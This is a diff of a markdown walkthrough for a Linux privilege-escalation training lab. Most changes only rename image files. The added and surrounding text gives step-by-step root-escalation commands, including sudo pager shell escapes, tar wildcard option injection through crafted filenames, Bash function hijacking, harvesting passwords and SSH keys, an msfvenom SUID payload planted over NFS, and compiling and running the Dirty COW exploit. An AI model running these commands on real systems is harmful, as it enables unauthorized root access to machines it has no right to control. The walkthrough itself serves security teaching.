@@ -111,7 +111,7 @@ Note that the /etc/shadow file on the VM is world-writable
 ls -l /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>
 
 Generate a new password hash with a password of your choice.
 
@@ -252,7 +252,7 @@ TERM= sudo more /etc/profile
 
 <figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### **less**
 
@@ -265,7 +265,7 @@ sudo less /etc/profile
 !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -418,7 +418,7 @@ Create a shared object with the same name as one of the listed libraries (libcry
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (8).png" alt=""><figcaption></figcaption></figure>
 
 Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.
 
@@ -525,7 +525,7 @@ Wait for the cron job to run (should not take longer than a minute). Run the /tm
 /tmp/rootbash -p
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Cron Jobs - Wildcards
 
@@ -537,7 +537,7 @@ View the contents of the other cron job script
 cat /usr/local/bin/compress.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Note that the tar command is being run with a wildcard (\*) in your home directory.
 
@@ -576,7 +576,7 @@ touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
 
@@ -614,7 +614,7 @@ Run the exploit script to gain a root shell:
 /home/user/tools/suid/exim/cve-2016-1531.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (7).png" alt=""><figcaption></figcaption></figure>
 
 ## SUID / SGID Executables - Shared Object Injection
 
@@ -688,7 +688,7 @@ Run strings on the file to look for strings of printable characters.
 strings /usr/local/bin/suid-env
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
 
@@ -733,7 +733,7 @@ Verify this with strings
 strings /usr/local/bin/suid-env2
 ```
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
 
@@ -745,7 +745,7 @@ Verify the version of Bash installed on the Debian VM is less than 4.2-048.
 /bin/bash --version
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
 
@@ -764,7 +764,7 @@ Run the suid-env2 executable to gain a root shell.
 /usr/local/bin/suid-env2
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## SUID / SGID Executables - Abusing Shell Features (#2)
 
@@ -786,7 +786,7 @@ Run the /tmp/rootbash executable with -p to gain a shell running with root privi
 /tmp/rootbash -p
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Passwords & Keys - History Files
 
@@ -800,7 +800,7 @@ View the contents of all the hidden history files in the user's home directory.
 cat ~/.*history | less
 ```
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
 
@@ -836,7 +836,7 @@ cat /home/user/myvpn.ovpn
 
 The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials.
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -854,7 +854,7 @@ ls -la /
 
 Note that there appears to be a hidden directory called .ssh. View the contents of the directory.
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Note that there is a world-readable file called root\_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
 
@@ -866,7 +866,7 @@ Copy the key over to your Kali box (it's easier to just view the contents of the
 ls -l /.ssh
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):
 
@@ -876,27 +876,101 @@ Use the key to login to the Debian VM as the root account (note that due to the 
 </strong><strong>ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.99.76
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
-##
+## NFS
 
-##
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
 
+Check the NFS share configuration on the Debian VM.
 
+**Victim**
 
+```
+cat /etc/exports
+```
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+Note that the /tmp share has root squashing disabled.
 
+On your Kali box, switch to your root user if you are not already running as root.
 
+**Kali**
 
+```
+sudo su
+```
 
-##
+Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly).
 
+**Kali**
 
+```
+mkdir /tmp/nfs
+mount -o rw,vers=3 $VICTIM:/tmp /tmp/nfs
+```
 
+Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash).
 
+**Kali**
 
+```
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
 
+Still using Kali's root user, make the file executable and set the SUID permission.
+
+**Kali**
+
+```
+chmod +xs /tmp/nfs/shell.elf
+```
+
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell.
+
+**Victim**
+
+```
+/tmp/shell.elf
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+## Kernel Exploits
+
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+
+Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system.
+
+**Victim**
+
+```
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+
+Compile the code and run it (note that it may take several minutes to complete).
+
+**Victim**
+
+```
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+```
+
+Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+
+**Victim**
+
+```
+/usr/bin/passwd
+```
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 
 
